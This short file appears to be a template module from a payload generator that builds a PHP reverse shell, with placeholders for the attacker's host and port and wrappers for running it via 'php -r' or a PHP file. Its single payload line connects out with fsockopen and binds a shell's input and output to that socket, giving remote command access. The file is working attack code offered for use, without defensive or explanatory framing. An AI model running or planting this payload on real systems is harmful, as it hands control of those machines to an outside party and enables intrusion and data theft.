USAGE = 'host port'
NARGS = [2, 2]
LANG = 'php'
EXEC = '''
php -r 'PAYLOAD'
<?php PAYLOAD
'''


pl = '''
$VAR0=fsockopen("ARG1",ARG2);exec("sh<&3 >&3 2>&3");
'''
